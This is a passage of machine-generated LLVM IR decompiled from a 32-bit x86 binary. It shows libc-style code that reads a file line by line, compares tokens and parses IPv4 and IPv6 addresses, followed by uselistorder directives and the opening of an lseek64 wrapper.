  %v3_8056d65 = add i32 %v0_8056d60, %v2_8056d65
  %v4_8056d65 = inttoptr i32 %v3_8056d65 to i8*
  %v5_8056d65 = load i8, i8* %v4_8056d65, align 1
  %v6_8056d65 = and i8 %v5_8056d65, 32
  %v7_8056d65 = icmp eq i8 %v6_8056d65, 0
  %v1_8056d69 = icmp eq i1 %v7_8056d65, false
  br i1 %v1_8056d69, label %dec_label_pc_8056d53, label %dec_label_pc_8056d6b

dec_label_pc_8056d6b:                             ; preds = %dec_label_pc_8056d5d
  %v0_8056d6b = load i32, i32* @edi, align 4
  %v1_8056d6b = add i32 %v0_8056d6b, -6
  %v6_8056d6b = sub i32 5, %v0_8056d6b
  %v7_8056d6b = and i32 %v6_8056d6b, %v0_8056d6b
  %v8_8056d6b = icmp slt i32 %v7_8056d6b, 0
  %v9_8056d6b = icmp eq i32 %v1_8056d6b, 0
  %v10_8056d6b = icmp slt i32 %v1_8056d6b, 0
  %v3_8056d6e = icmp eq i1 %v10_8056d6b, %v8_8056d6b
  %v4_8056d6e = icmp eq i1 %v9_8056d6b, false
  %v5_8056d6e = and i1 %v4_8056d6e, %v3_8056d6e
  br i1 %v5_8056d6e, label %dec_label_pc_8056d77.preheader, label %dec_label_pc_8056d70

dec_label_pc_8056d70:                             ; preds = %dec_label_pc_8056d6b
  %v1_8056d70 = load i32, i32* @ebx, align 4
  %v3_8056d70 = mul i32 %v0_8056d6b, 4
  %v4_8056d70 = add i32 %v1_8056d70, %v3_8056d70
  %v5_8056d70 = inttoptr i32 %v4_8056d70 to i32*
  store i32 %v0_8056d53103, i32* %v5_8056d70, align 4
  %v0_8056d73 = load i32, i32* @edi, align 4
  %v1_8056d73 = add i32 %v0_8056d73, 1
  store i32 %v1_8056d73, i32* @edi, align 4
  %v0_8056d77.pre.pre = load i32, i32* @ecx, align 4
  %v4_8056d77.pre.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8056d77.preheader

dec_label_pc_8056d77.preheader:                   ; preds = %dec_label_pc_8056d70, %dec_label_pc_8056d6b
  %v4_8056d77.pre = phi i32 [ %v4_8056d77.pre.pre, %dec_label_pc_8056d70 ], [ %v0_8056d60, %dec_label_pc_8056d6b ]
  %v0_8056d77.pre = phi i32 [ %v0_8056d77.pre.pre, %dec_label_pc_8056d70 ], [ %v0_8056d53103, %dec_label_pc_8056d6b ]
  %v0_8056d9054 = phi i32 [ %v1_8056d73, %dec_label_pc_8056d70 ], [ %v0_8056d6b, %dec_label_pc_8056d6b ]
  %v1_8056d77106 = inttoptr i32 %v0_8056d77.pre to i8*
  %v2_8056d77107 = load i8, i8* %v1_8056d77106, align 1
  %v3_8056d77108 = zext i8 %v2_8056d77107 to i32
  %v5_8056d77109 = and i32 %v4_8056d77.pre, -256
  %v6_8056d77110 = or i32 %v3_8056d77108, %v5_8056d77109
  store i32 %v6_8056d77110, i32* @eax, align 4
  %v4_8056d79111 = icmp eq i8 %v2_8056d77107, 0
  br i1 %v4_8056d79111, label %dec_label_pc_8056d8b.loopexit, label %dec_label_pc_8056d7d.lr.ph

dec_label_pc_8056d7d.lr.ph:                       ; preds = %dec_label_pc_8056d77.preheader
  %v0_8056d80.pre = load i32, i32* @global_var_80622cc, align 4
  br label %dec_label_pc_8056d7d

dec_label_pc_8056d76:                             ; preds = %dec_label_pc_8056d7d
  %v1_8056d76 = add i32 %v0_8056d8b113, 1
  store i32 %v1_8056d76, i32* @ecx, align 4
  %v1_8056d77 = inttoptr i32 %v1_8056d76 to i8*
  %v2_8056d77 = load i8, i8* %v1_8056d77, align 1
  %v3_8056d77 = zext i8 %v2_8056d77 to i32
  %v5_8056d77 = and i32 %v0_8056d80.pre, -256
  %v6_8056d77 = or i32 %v3_8056d77, %v5_8056d77
  store i32 %v6_8056d77, i32* @eax, align 4
  %v4_8056d79 = icmp eq i8 %v2_8056d77, 0
  br i1 %v4_8056d79, label %dec_label_pc_8056d8b.loopexit, label %dec_label_pc_8056d7d

dec_label_pc_8056d7d:                             ; preds = %dec_label_pc_8056d7d.lr.ph, %dec_label_pc_8056d76
  %v2_8056d77115 = phi i8 [ %v2_8056d77107, %dec_label_pc_8056d7d.lr.ph ], [ %v2_8056d77, %dec_label_pc_8056d76 ]
  %v1_8056d77114 = phi i8* [ %v1_8056d77106, %dec_label_pc_8056d7d.lr.ph ], [ %v1_8056d77, %dec_label_pc_8056d76 ]
  %v0_8056d8b113 = phi i32 [ %v0_8056d77.pre, %dec_label_pc_8056d7d.lr.ph ], [ %v1_8056d76, %dec_label_pc_8056d76 ]
  %v2_8056d7d = sext i8 %v2_8056d77115 to i32
  store i32 %v2_8056d7d, i32* @edx, align 4
  store i32 %v0_8056d80.pre, i32* @eax, align 4
  %v2_8056d85 = mul nsw i32 %v2_8056d7d, 2
  %v3_8056d85 = add i32 %v0_8056d80.pre, %v2_8056d85
  %v4_8056d85 = inttoptr i32 %v3_8056d85 to i8*
  %v5_8056d85 = load i8, i8* %v4_8056d85, align 1
  %v6_8056d85 = and i8 %v5_8056d85, 32
  %v7_8056d85 = icmp eq i8 %v6_8056d85, 0
  br i1 %v7_8056d85, label %dec_label_pc_8056d76, label %dec_label_pc_8056d8b.loopexit

dec_label_pc_8056d8b.loopexit:                    ; preds = %dec_label_pc_8056d7d, %dec_label_pc_8056d76, %dec_label_pc_8056d77.preheader
  %v4_8056d5798139 = phi i32 [ %v6_8056d77110, %dec_label_pc_8056d77.preheader ], [ %v6_8056d77, %dec_label_pc_8056d76 ], [ %v0_8056d80.pre, %dec_label_pc_8056d7d ]
  %v0_8056d8b.lcssa = phi i32 [ %v0_8056d77.pre, %dec_label_pc_8056d77.preheader ], [ %v1_8056d76, %dec_label_pc_8056d76 ], [ %v0_8056d8b113, %dec_label_pc_8056d7d ]
  %v1_8056d77.lcssa = phi i8* [ %v1_8056d77106, %dec_label_pc_8056d77.preheader ], [ %v1_8056d77, %dec_label_pc_8056d76 ], [ %v1_8056d77114, %dec_label_pc_8056d7d ]
  %v2_8056d8b = load i8, i8* %v1_8056d77.lcssa, align 1
  %v3_8056d8b = icmp eq i8 %v2_8056d8b, 0
  %v1_8056d8e = icmp eq i1 %v3_8056d8b, false
  br i1 %v1_8056d8e, label %dec_label_pc_8056d57.preheader, label %dec_label_pc_8056d90

dec_label_pc_8056d57.preheader:                   ; preds = %dec_label_pc_8056d57.preheader.preheader, %dec_label_pc_8056d8b.loopexit
  %v0_8056d90.pre142 = phi i32 [ %v0_8056d9054, %dec_label_pc_8056d8b.loopexit ], [ 0, %dec_label_pc_8056d57.preheader.preheader ]
  %v4_8056d5798 = phi i32 [ %v4_8056d5798139, %dec_label_pc_8056d8b.loopexit ], [ %v4_8056d5798.pre, %dec_label_pc_8056d57.preheader.preheader ]
  %v0_8056d5749 = phi i32 [ %v0_8056d8b.lcssa, %dec_label_pc_8056d8b.loopexit ], [ %stack_var_-20.0.in, %dec_label_pc_8056d57.preheader.preheader ]
  %v1_8056d5795 = inttoptr i32 %v0_8056d5749 to i8*
  %v2_8056d5796 = load i8, i8* %v1_8056d5795, align 1
  %v3_8056d5797 = zext i8 %v2_8056d5796 to i32
  %v5_8056d5799 = and i32 %v4_8056d5798, -256
  %v6_8056d57100 = or i32 %v5_8056d5799, %v3_8056d5797
  store i32 %v6_8056d57100, i32* @eax, align 4
  %v4_8056d59101 = icmp eq i8 %v2_8056d5796, 0
  br i1 %v4_8056d59101, label %dec_label_pc_8056d90, label %dec_label_pc_8056d5d

dec_label_pc_8056d57.dec_label_pc_8056d90.loopexit_crit_edge: ; preds = %dec_label_pc_8056d53
  %v0_8056d90.pre.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8056d90

dec_label_pc_8056d90:                             ; preds = %dec_label_pc_8056d8b.loopexit, %dec_label_pc_8056d57.dec_label_pc_8056d90.loopexit_crit_edge, %dec_label_pc_8056d57.preheader, %dec_label_pc_8056d4b
  %v1_8056d93 = phi i32 [ 0, %dec_label_pc_8056d4b ], [ %v0_8056d90.pre.pre, %dec_label_pc_8056d57.dec_label_pc_8056d90.loopexit_crit_edge ], [ %v0_8056d90.pre142, %dec_label_pc_8056d57.preheader ], [ %v0_8056d9054, %dec_label_pc_8056d8b.loopexit ]
  %v0_8056d93 = load i32, i32* @ebx, align 4
  %v2_8056d93 = mul i32 %v1_8056d93, 4
  %v3_8056d93 = add i32 %v0_8056d93, %v2_8056d93
  %v4_8056d93 = inttoptr i32 %v3_8056d93 to i32*
  store i32 0, i32* %v4_8056d93, align 4
  %v7_8056d9a = icmp sgt i32 %v1_8056d93, 1
  br i1 %v7_8056d9a, label %dec_label_pc_8056da0, label %dec_label_pc_8056e33

dec_label_pc_8056da0:                             ; preds = %dec_label_pc_8056d90
  br i1 %v12_8056bd2, label %dec_label_pc_8056e6d, label %dec_label_pc_8056dab

dec_label_pc_8056dab:                             ; preds = %dec_label_pc_8056da0
  store i32 1, i32* @esi, align 4
  br i1 %v1_8056db5, label %dec_label_pc_8056de3.preheader, label %dec_label_pc_8056db7

dec_label_pc_8056de3.preheader:                   ; preds = %dec_label_pc_8056dab
  %v1_8056de3119 = load i32, i32* @edi, align 4
  %v5_8056de5128 = icmp sgt i32 %v1_8056de3119, 1
  br i1 %v5_8056de5128, label %dec_label_pc_8056dcd.lr.ph, label %dec_label_pc_8056e33

dec_label_pc_8056dcd.lr.ph:                       ; preds = %dec_label_pc_8056de3.preheader
  br label %dec_label_pc_8056dcd

dec_label_pc_8056db7:                             ; preds = %dec_label_pc_8056dab
  %v0_8056db7 = load i32, i32* @eax, align 4
  %v0_8056db9 = load i32, i32* @ebx, align 4
  %v1_8056db9 = inttoptr i32 %v0_8056db9 to i32*
  %v2_8056db9 = load i32, i32* %v1_8056db9, align 4
  %v5_8056dbf = call i32 @__GI_strcoll(i8* %v2_8056dd6, i32 %v2_8056db9, i32 %v0_8056db7, i32 %v0_8056db7)
  store i32 %v5_8056dbf, i32* %eax.global-to-local, align 4
  %v1_8056dc7 = icmp eq i32 %v5_8056dbf, 0
  %v1_8056dc9 = icmp eq i1 %v1_8056dc7, false
  br i1 %v1_8056dc9, label %dec_label_pc_8056e33, label %dec_label_pc_8056de9

dec_label_pc_8056dcd:                             ; preds = %dec_label_pc_8056dcd.lr.ph, %dec_label_pc_8056de2
  %v1_8056dcf129 = phi i32 [ 1, %dec_label_pc_8056dcd.lr.ph ], [ %v1_8056de2, %dec_label_pc_8056de2 ]
  %v0_8056dcf = load i32, i32* @ebx, align 4
  %v2_8056dcf = mul i32 %v1_8056dcf129, 4
  %v3_8056dcf = add i32 %v0_8056dcf, %v2_8056dcf
  %v4_8056dcf = inttoptr i32 %v3_8056dcf to i32*
  %v5_8056dcf = load i32, i32* %v4_8056dcf, align 4
  %v3_8056dd6 = call i32 @__GI_strcasecmp(i8* %v2_8056dd6, i32 %v5_8056dcf)
  store i32 %v3_8056dd6, i32* %eax.global-to-local, align 4
  %v1_8056dde = icmp eq i32 %v3_8056dd6, 0
  br i1 %v1_8056dde, label %dec_label_pc_8056de9, label %dec_label_pc_8056de2

dec_label_pc_8056de2:                             ; preds = %dec_label_pc_8056dcd
  %v0_8056de2 = load i32, i32* @esi, align 4
  %v1_8056de2 = add i32 %v0_8056de2, 1
  store i32 %v1_8056de2, i32* @esi, align 4
  %v1_8056de3 = load i32, i32* @edi, align 4
  %v5_8056de5 = icmp slt i32 %v1_8056de2, %v1_8056de3
  br i1 %v5_8056de5, label %dec_label_pc_8056dcd, label %dec_label_pc_8056e33

dec_label_pc_8056de9:                             ; preds = %dec_label_pc_8056db7, %dec_label_pc_8056dcd
  br i1 %v1_8056dee, label %dec_label_pc_8056e0b, label %dec_label_pc_8056df0

dec_label_pc_8056df0:                             ; preds = %dec_label_pc_8056de9
  %v0_8056df0 = load i32, i32* @esi, align 4
  %v3_8056df1 = load i8*, i8** %stack_var_-44, align 4
  %v4_8056df1 = ptrtoint i8* %v3_8056df1 to i32
  %v0_8056df5 = load i32, i32* @ebx, align 4
  %v1_8056df5 = inttoptr i32 %v0_8056df5 to i32*
  %v2_8056df5 = load i32, i32* %v1_8056df5, align 4
  %v4_8056df9 = inttoptr i32 %v2_8056df5 to i8*
  %v5_8056df9 = call i32 @inet_pton(i32 2, i8* %v4_8056df9, i32 %v4_8056df1, i32 %v0_8056df0)
  store i32 %v5_8056df9, i32* %eax.global-to-local, align 4
  %tmp85 = icmp slt i32 %v5_8056df9, 1
  %tmp86 = icmp eq i1 %tmp85, false
  br i1 %tmp86, label %dec_label_pc_8056c89, label %dec_label_pc_8056e33.outer

dec_label_pc_8056e0b:                             ; preds = %dec_label_pc_8056de9
  br i1 %v1_8056e10, label %dec_label_pc_8056e33.outer, label %dec_label_pc_8056e12

dec_label_pc_8056e12:                             ; preds = %dec_label_pc_8056e0b
  %v0_8056e12 = load i32, i32* @ecx, align 4
  %v0_8056e17 = load i32, i32* @ebx, align 4
  %v1_8056e17 = inttoptr i32 %v0_8056e17 to i32*
  %v2_8056e17 = load i32, i32* %v1_8056e17, align 4
  %v4_8056e1b = inttoptr i32 %v2_8056e17 to i8*
  %v5_8056e1b = call i32 @inet_pton(i32 10, i8* %v4_8056e1b, i32 %stack_var_-36.0, i32 %v0_8056e12)
  store i32 %v5_8056e1b, i32* %eax.global-to-local, align 4
  %tmp87 = icmp slt i32 %v5_8056e1b, 1
  %tmp88 = icmp eq i1 %tmp87, false
  br i1 %tmp88, label %dec_label_pc_8056cb6, label %dec_label_pc_8056e33.outer

dec_label_pc_8056e33:                             ; preds = %dec_label_pc_8056de3.preheader, %dec_label_pc_8056de2, %dec_label_pc_8056d90, %dec_label_pc_8056db7, %dec_label_pc_8056e33.outer
  %v0_8056e33 = load i32, i32* @edx, align 4
  %v3_8056e3d = call i32 @fgets(i32 %stack_var_-20.0.in, i32 %stack_var_4.0, i32 %v0_8056e33)
  store i32 %v3_8056e3d, i32* @eax, align 4
  %v1_8056e45 = icmp eq i32 %v3_8056e3d, 0
  %v1_8056e47 = icmp eq i1 %v1_8056e45, false
  br i1 %v1_8056e47, label %dec_label_pc_8056d34, label %dec_label_pc_8056e4d

dec_label_pc_8056e4d:                             ; preds = %dec_label_pc_8056e33, %dec_label_pc_8056ce2
  %stack_var_-28.1 = phi i32 [ 0, %dec_label_pc_8056ce2 ], [ %stack_var_-28.0.ph, %dec_label_pc_8056e33 ]
  br i1 %v12_8056bd2, label %dec_label_pc_8056e6d, label %dec_label_pc_8056e54

dec_label_pc_8056e54:                             ; preds = %dec_label_pc_8056e4d
  %v1_8056e5b = inttoptr i32 %stack_var_4.0 to i16*
  %v2_8056e5b = call i32 @__GI_fclose(i16* %v1_8056e5b)
  store i32 %v2_8056e5b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8056e6d

dec_label_pc_8056e6d:                             ; preds = %dec_label_pc_8056da0, %dec_label_pc_8056bbd, %dec_label_pc_8056bc9, %dec_label_pc_8056be7, %dec_label_pc_8056bfa, %dec_label_pc_8056c06, %dec_label_pc_8056c0f, %dec_label_pc_8056c39, %dec_label_pc_8056e4d, %dec_label_pc_8056e54, %dec_label_pc_8056c6f
  %stack_var_-28.2 = phi i32 [ %stack_var_-28.1, %dec_label_pc_8056e4d ], [ %stack_var_-28.1, %dec_label_pc_8056e54 ], [ %v2_8056c7e, %dec_label_pc_8056c6f ], [ 34, %dec_label_pc_8056c39 ], [ 34, %dec_label_pc_8056c0f ], [ 34, %dec_label_pc_8056c06 ], [ 34, %dec_label_pc_8056bfa ], [ 34, %dec_label_pc_8056be7 ], [ 34, %dec_label_pc_8056bc9 ], [ 34, %dec_label_pc_8056bbd ], [ %stack_var_-28.0.ph, %dec_label_pc_8056da0 ]
  store i32 %stack_var_-28.2, i32* %eax.global-to-local, align 4
  store i32 %v0_8056ba8, i32* @ebx, align 4
  store i32 %v0_8056ba7, i32* @esi, align 4
  store i32 %v0_8056ba6, i32* @edi, align 4
  store i32 %v0_8056ba5, i32* @ebp, align 4
  ret i32 %stack_var_-28.2

; uselistorder directives
  uselistorder i32 %stack_var_-28.2, { 1, 0 }
  uselistorder i32 %v1_8056de2, { 0, 2, 1 }
  uselistorder i32 %v1_8056d93, { 1, 0 }
  uselistorder i8 %v2_8056d5796, { 1, 2, 0 }
  uselistorder i8* %v1_8056d5795, { 1, 0 }
  uselistorder i32 %v0_8056d5749, { 1, 0 }
  uselistorder i32 %v2_8056d7d, { 1, 0 }
  uselistorder i32 %v1_8056d76, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8056d80.pre, { 0, 2, 3, 1 }
  uselistorder i32 %v1_8056d6b, { 1, 0 }
  uselistorder i32 %v0_8056d6b, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v2_8056d5d, { 1, 0 }
  uselistorder i8* %v2_8056dd6, { 1, 0 }
  uselistorder i32 %storemerge3, { 1, 2, 0 }
  uselistorder i32 %stack_var_4.0, { 1, 0 }
  uselistorder i32 %stack_var_-40.0, { 1, 2, 0 }
  uselistorder i32 %stack_var_-20.0.in, { 2, 0, 1, 3 }
  uselistorder i32 %v0_8056c1b, { 2, 1, 0, 3 }
  uselistorder i32 %v0_8056bfa, { 1, 0, 2, 3 }
  uselistorder i32 %v1_8056bd7, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_8056bde, { 1, 0 }
  uselistorder i32 %v1_8056bb8, { 4, 3, 2, 1, 0 }
  uselistorder i8** %stack_var_-44, { 2, 0, 1 }
  uselistorder i32 %tmp60, { 0, 3, 1, 2 }
  uselistorder i32* %edx.global-to-local, { 4, 5, 6, 0, 1, 2, 3, 7, 8, 9, 10, 11, 13, 12, 14 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 4, 8, 9, 10, 11, 13, 12, 2, 3, 5, 6, 7, 14, 17, 15, 16, 18, 19, 20, 21, 22 }
  uselistorder i32 34, { 3, 4, 5, 6, 7, 8, 9, 12, 13, 14, 15, 11, 1, 2, 17, 18, 16, 10, 0 }
  uselistorder i32 (i16*)* @__GI_fclose, { 3, 4, 0, 2, 1 }
  uselistorder i32 (i32, i32, i32)* @fgets, { 1, 0, 2 }
  uselistorder i32 (i8*, i32)* @__GI_strcasecmp, { 1, 0 }
  uselistorder i32 5, { 15, 26, 27, 28, 0, 14, 8, 9, 19, 10, 29, 30, 2, 4, 23, 16, 24, 25, 7, 20, 11, 6, 21, 5, 22, 12, 13, 17, 18, 3, 1 }
  uselistorder i32 -6, { 1, 0, 2 }
  uselistorder i8 32, { 20, 21, 22, 23, 24, 16, 0, 7, 17, 13, 14, 15, 8, 25, 18, 19, 26, 27, 2, 11, 3, 9, 1, 12, 4, 10, 5, 6 }
  uselistorder i32* @global_var_80622cc, { 0, 4, 2, 5, 1, 3, 6, 7 }
  uselistorder i32 -256, { 1, 86, 0, 87, 12, 19, 88, 89, 3, 70, 69, 2, 90, 91, 6, 92, 4, 93, 5, 94, 106, 8, 72, 71, 7, 50, 51, 95, 52, 53, 54, 55, 56, 57, 13, 58, 101, 102, 108, 14, 25, 15, 109, 110, 99, 98, 9, 104, 105, 68, 96, 59, 60, 61, 62, 63, 64, 65, 10, 66, 67, 97, 20, 21, 22, 23, 24, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 16, 17, 18, 11, 100, 103, 107 }
  uselistorder i32 35, { 1, 3, 2, 0 }
  uselistorder i32 10, { 20, 0, 29, 30, 31, 32, 33, 34, 1, 12, 21, 2, 8, 35, 9, 10, 11, 22, 3, 14, 27, 28, 13, 37, 23, 4, 24, 19, 18, 15, 16, 7, 36, 5, 25, 26, 17, 6 }
  uselistorder i32 12, { 78, 79, 80, 0, 81, 17, 41, 1, 82, 97, 24, 22, 7, 23, 8, 9, 10, 11, 12, 13, 14, 83, 57, 58, 59, 60, 61, 62, 63, 64, 2, 18, 19, 65, 66, 67, 131, 27, 42, 77, 96, 43, 44, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 45, 46, 47, 48, 49, 50, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 25, 130, 86, 87, 88, 89, 132, 68, 3, 4, 69, 70, 15, 16, 71, 5, 84, 85, 51, 52, 53, 54, 55, 56, 26, 72, 20, 73, 74, 21, 75, 76, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 90, 91, 92, 93, 94, 95, 6 }
  uselistorder i32 80, { 0, 5, 6, 7, 8, 9, 10, 11, 2, 3, 4, 1 }
  uselistorder i32 56, { 8, 7, 13, 1, 14, 15, 16, 17, 3, 10, 4, 11, 5, 2, 6, 18, 12, 9, 0 }
  uselistorder i32 44, { 11, 12, 13, 8, 1, 9, 10, 23, 15, 7, 20, 22, 21, 17, 18, 19, 16, 14, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 36, { 11, 12, 13, 15, 16, 17, 18, 19, 20, 2, 21, 3, 4, 22, 14, 6, 7, 8, 9, 10, 5, 1, 0 }
  uselistorder i32 -44, { 1, 0 }
  uselistorder i32 48, { 15, 17, 18, 0, 8, 5, 1, 10, 6, 7, 11, 12, 13, 14, 4, 3, 16, 2, 9 }
  uselistorder i32 -48, { 2, 3, 4, 1, 0 }
  uselistorder i32 16, { 92, 91, 0, 93, 94, 15, 9, 95, 16, 96, 52, 53, 104, 105, 106, 107, 108, 109, 116, 110, 111, 112, 113, 114, 115, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 97, 98, 99, 100, 54, 55, 56, 57, 58, 59, 60, 61, 137, 17, 18, 33, 23, 47, 34, 42, 88, 43, 141, 1, 44, 45, 46, 3, 2, 135, 5, 4, 136, 7, 6, 127, 128, 19, 142, 101, 102, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 24, 77, 78, 79, 80, 138, 139, 140, 103, 14, 10, 32, 25, 48, 49, 50, 51, 26, 20, 21, 81, 82, 83, 84, 85, 86, 22, 27, 87, 35, 36, 37, 38, 39, 40, 41, 89, 90, 13, 28, 129, 130, 131, 132, 133, 11, 8, 29, 134, 12, 30, 31 }
  uselistorder i32 8, { 130, 129, 131, 0, 1, 132, 133, 134, 135, 136, 137, 8, 138, 2, 17, 139, 140, 141, 142, 33, 143, 91, 37, 19, 20, 21, 22, 38, 23, 24, 39, 40, 25, 41, 26, 42, 43, 145, 92, 93, 94, 95, 96, 97, 35, 34, 98, 99, 100, 101, 206, 207, 208, 30, 214, 31, 215, 50, 32, 51, 27, 72, 128, 158, 73, 74, 160, 161, 162, 163, 164, 165, 166, 9, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 10, 75, 76, 77, 78, 79, 80, 81, 82, 177, 178, 179, 180, 181, 45, 11, 46, 12, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 44, 199, 200, 13, 201, 202, 203, 204, 14, 205, 152, 153, 3, 213, 102, 146, 147, 4, 5, 52, 103, 104, 105, 106, 108, 109, 110, 107, 111, 112, 113, 114, 28, 29, 115, 116, 117, 118, 119, 120, 209, 210, 211, 148, 149, 150, 151, 144, 212, 83, 84, 85, 86, 6, 87, 88, 36, 89, 90, 47, 48, 49, 121, 122, 123, 124, 125, 126, 127, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 18, 154, 155, 156, 157, 7, 159, 16, 15 }
  uselistorder i32 -32, { 5, 0, 1, 2, 3, 4 }
  uselistorder i32 32, { 72, 0, 73, 74, 29, 31, 79, 30, 80, 81, 82, 43, 44, 59, 86, 32, 52, 70, 71, 54, 55, 6, 5, 7, 8, 45, 9, 10, 53, 11, 12, 13, 14, 15, 1, 77, 75, 76, 60, 61, 2, 62, 63, 64, 65, 66, 67, 68, 16, 69, 46, 84, 85, 78, 83, 56, 57, 58, 34, 17, 47, 48, 18, 49, 3, 20, 19, 35, 36, 50, 4, 37, 21, 22, 24, 23, 38, 26, 25, 39, 41, 28, 27, 40, 42, 33, 51 }
  uselistorder i32 4, { 269, 270, 271, 265, 263, 264, 266, 267, 268, 0, 6, 272, 273, 274, 275, 276, 277, 278, 279, 280, 34, 55, 149, 150, 151, 35, 36, 37, 281, 50, 1, 234, 7, 8, 189, 190, 191, 192, 193, 194, 282, 283, 286, 287, 288, 289, 290, 291, 60, 292, 298, 299, 300, 69, 38, 301, 302, 303, 304, 39, 40, 41, 70, 42, 43, 71, 44, 305, 45, 306, 72, 46, 73, 74, 9, 293, 294, 75, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 56, 205, 378, 206, 379, 380, 386, 387, 392, 393, 394, 381, 51, 97, 229, 230, 382, 383, 384, 385, 10, 152, 153, 154, 155, 76, 250, 251, 252, 61, 318, 319, 320, 321, 156, 157, 158, 159, 160, 62, 11, 161, 162, 388, 390, 332, 333, 334, 335, 336, 337, 12, 338, 339, 340, 341, 342, 343, 344, 345, 330, 331, 164, 47, 165, 166, 167, 168, 169, 170, 171, 13, 173, 172, 346, 53, 347, 348, 349, 350, 351, 352, 353, 354, 355, 356, 357, 358, 359, 360, 361, 362, 363, 364, 365, 366, 32, 367, 368, 54, 369, 14, 163, 389, 231, 232, 307, 308, 52, 309, 310, 311, 312, 2, 15, 3, 391, 16, 174, 207, 17, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 48, 49, 98, 77, 225, 226, 227, 295, 296, 57, 297, 284, 285, 175, 176, 177, 18, 178, 19, 33, 20, 21, 179, 180, 22, 181, 78, 182, 79, 183, 184, 80, 185, 81, 82, 186, 83, 187, 84, 188, 228, 233, 235, 236, 237, 58, 238, 239, 240, 63, 64, 65, 241, 85, 86, 87, 88, 89, 66, 242, 90, 243, 67, 244, 245, 59, 246, 247, 248, 68, 249, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 95, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 91, 313, 314, 315, 316, 317, 4, 322, 23, 24, 323, 25, 92, 93, 96, 324, 94, 26, 27, 325, 326, 327, 328, 28, 5, 29, 30, 329, 31, 370, 371, 372, 373, 374, 375, 376, 377, 395, 396, 397, 148 }
  uselistorder i32* @ebp, { 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 9, 10, 11, 12, 13, 14, 15, 2, 93, 94, 95, 100, 96, 97, 98, 99, 101, 38, 39, 102, 106, 117, 118, 148, 149, 150, 40, 41, 42, 43, 44, 232, 16, 17, 18, 76, 77, 203, 204, 205, 206, 207, 19, 20, 208, 209, 210, 211, 212, 213, 214, 215, 220, 216, 217, 218, 219, 1, 221, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 4, 45, 46, 47, 48, 49, 112, 0, 113, 114, 115, 116, 107, 108, 109, 110, 111, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 3, 66, 6, 7, 8, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 67, 68, 69, 103, 104, 105, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 70, 71, 72, 73, 74, 75, 5, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 186, 187, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 222, 223, 224, 225, 228, 229, 226, 227, 233, 230, 231 }
  uselistorder i32 %arg9, { 3, 1, 2, 0 }
  uselistorder i32 %arg8, { 3, 2, 1, 0 }
  uselistorder i32 %arg7, { 1, 0, 2, 3 }
  uselistorder i32 %arg6, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_8056e6d, { 9, 8, 0, 10, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_8056e33, { 1, 3, 0, 2, 4 }
  uselistorder label %dec_label_pc_8056de9, { 1, 0 }
  uselistorder label %dec_label_pc_8056dcd, { 1, 0 }
  uselistorder label %dec_label_pc_8056d90, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_8056d57.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_8056d7d, { 1, 0 }
  uselistorder label %dec_label_pc_8056d4b, { 1, 0 }
  uselistorder label %dec_label_pc_8056e33.outer, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_8056d1d, { 1, 0 }
  uselistorder label %dec_label_pc_8056ce2, { 1, 0 }
  uselistorder label %dec_label_pc_8056c39, { 1, 0 }
  uselistorder label %dec_label_pc_8056bc9, { 1, 0 }
}

define i32 @__libc_lseek64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_8056e7e = load i32, i32* @ebx, align 4
  store i32 %v0_8056e7e, i32* %stack_var_-12, align 4
  %v2_8056e86 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_8056e86, i32* %esi.global-to-local, align 4
  %v1_8056ea0 = call i32 @int80_syscall(i32 140)
